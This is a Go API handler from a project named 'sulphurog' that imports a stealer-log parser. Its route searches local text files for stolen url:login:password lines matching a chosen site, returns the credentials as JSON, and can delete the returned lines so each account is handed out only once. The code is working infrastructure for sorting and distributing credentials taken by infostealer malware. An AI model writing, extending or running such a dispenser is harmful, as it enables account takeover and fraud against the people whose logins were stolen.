package api

import (
	"bytes"
	"fmt"
	"path/filepath"
	"strings"

	"github.com/gofiber/fiber/v2"
	"github.com/sulphurog/sulphurog/internal/infrastructure/localstorage"
	"github.com/sulphurog/sulphurog/internal/infrastructure/parser"
)

// MasterRouteHandler centraliza a manipulação de arquivos locais (txt, cookies, etc.).
// É uma super rota mestre que recebe parâmetros do site, tipo de arquivo e opção de remoção.
type MasterRouteHandler struct {
	storage *localstorage.Storage
	parser  *parser.StealerParser
}

func NewMasterRouteHandler(storage *localstorage.Storage) *MasterRouteHandler {
	return &MasterRouteHandler{
		storage: storage,
		parser:  parser.NewStealerParser(),
	}
}

// RegisterRoutes registra a rota mestre centralizada para manipulação de arquivos locais.
func (h *MasterRouteHandler) RegisterRoutes(app *fiber.App) {
	app.Post("/api/master/files", h.HandleFiles)
}

// FileRequest representa o body da requisição POST para a rota mestre.
type FileRequest struct {
	Site           string `form:"site" json:"site"`
	FileType       string `form:"file_type" json:"file_type"`
	RemoveAfterGet string `form:"removeafterget" json:"removeafterget"`
}

// HandleFiles é a super rota mestre:
// 1. Busca contas nos arquivos locais com base no site e tipo (txt ou cookies).
// 2. Processa e retorna as contas encontradas.
// 3. Se removeafterget=yes, apaga as contas utilizadas de todos os arquivos onde forem encontradas.
func (h *MasterRouteHandler) HandleFiles(c *fiber.Ctx) error {
	var req FileRequest
	if err := c.BodyParser(&req); err != nil {
		return c.Status(400).JSON(fiber.Map{"error": "invalid request body"})
	}

	site := strings.TrimSpace(req.Site)
	if site == "" {
		return c.Status(400).JSON(fiber.Map{"error": "site parameter is required"})
	}

	fileType := strings.ToLower(strings.TrimSpace(req.FileType))
	if fileType == "" {
		fileType = "txt"
	}
	if fileType != "txt" && fileType != "cookies" {
		return c.Status(400).JSON(fiber.Map{"error": "file_type must be 'txt' or 'cookies'"})
	}

	removeAfter := strings.ToLower(strings.TrimSpace(req.RemoveAfterGet)) == "yes"

	// Busca todos os arquivos locais
	files, err := h.storage.ListFiles()
	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": fmt.Sprintf("failed to list files: %v", err)})
	}

	var allAccounts []map[string]string
	// Mapa de arquivo -> linhas que contêm contas do site (para remoção)
	fileLinesToRemove := make(map[string]map[string]bool)

	for _, relPath := range files {
		ext := strings.ToLower(filepath.Ext(relPath))

		// Filtra por tipo de arquivo
		if fileType == "txt" && ext != ".txt" {
			continue
		}
		if fileType == "cookies" && ext != ".txt" {
			continue
		}

		data, err := h.storage.ReadFile(relPath)
		if err != nil {
			continue
		}

		// Busca contas do site nos arquivos
		accounts, matchedLines := h.findAccountsForSite(string(data), site, fileType)
		if len(accounts) > 0 {
			allAccounts = append(allAccounts, accounts...)
			if len(matchedLines) > 0 {
				if fileLinesToRemove[relPath] == nil {
					fileLinesToRemove[relPath] = make(map[string]bool)
				}
				for _, line := range matchedLines {
					fileLinesToRemove[relPath][line] = true
				}
			}
		}
	}

	// Se removeafterget=yes, apaga as contas utilizadas de todos os arquivos
	removed := 0
	if removeAfter {
		for relPath, linesToRemove := range fileLinesToRemove {
			data, err := h.storage.ReadFile(relPath)
			if err != nil {
				continue
			}
			newContent := h.removeLines(string(data), linesToRemove)
			if newContent != string(data) {
				if err := h.storage.WriteFile(relPath, []byte(newContent)); err != nil {
					continue
				}
				removed += len(linesToRemove)
			}
		}
	}

	return c.JSON(fiber.Map{
		"site":            site,
		"file_type":       fileType,
		"accounts_found":  len(allAccounts),
		"accounts":        allAccounts,
		"removed":         removed,
		"remove_after_get": removeAfter,
	})
}

// findAccountsForSite busca contas de um site específico no conteúdo de um arquivo.
// Retorna as contas encontradas e as linhas exatas que as contêm.
func (h *MasterRouteHandler) findAccountsForSite(content, site, fileType string) ([]map[string]string, []string) {
	var accounts []map[string]string
	var matchedLines []string

	lines := strings.Split(content, "\n")
	siteLower := strings.ToLower(site)

	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" {
			continue
		}

		// Verifica se a linha contém o site desejado
		if !strings.Contains(strings.ToLower(trimmed), siteLower) {
			continue
		}

		// Formato ULP: url:login:password ou url:username:password
		// O parser tenta extrair contas no formato simples
		if strings.Contains(trimmed, ":") {
			parts := strings.Split(trimmed, ":")
			if len(parts) >= 3 {
				password := strings.TrimSpace(parts[len(parts)-1])
				login := strings.TrimSpace(parts[len(parts)-2])
				url := strings.TrimSpace(strings.Join(parts[:len(parts)-2], ":"))

				// Validação básica
				if url != "" && login != "" && password != "" {
					account := map[string]string{
						"url":      url,
						"login":    login,
						"password": password,
					}
					accounts = append(accounts, account)
					matchedLines = append(matchedLines, trimmed)
				}
			}
		}
	}

	return accounts, matchedLines
}

// removeLines remove as linhas especificadas do conteúdo.
func (h *MasterRouteHandler) removeLines(content string, linesToRemove map[string]bool) string {
	var buf bytes.Buffer
	lines := strings.Split(content, "\n")
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if linesToRemove[trimmed] {
			continue
		}
		buf.WriteString(line)
		buf.WriteString("\n")
	}
	return buf.String()
}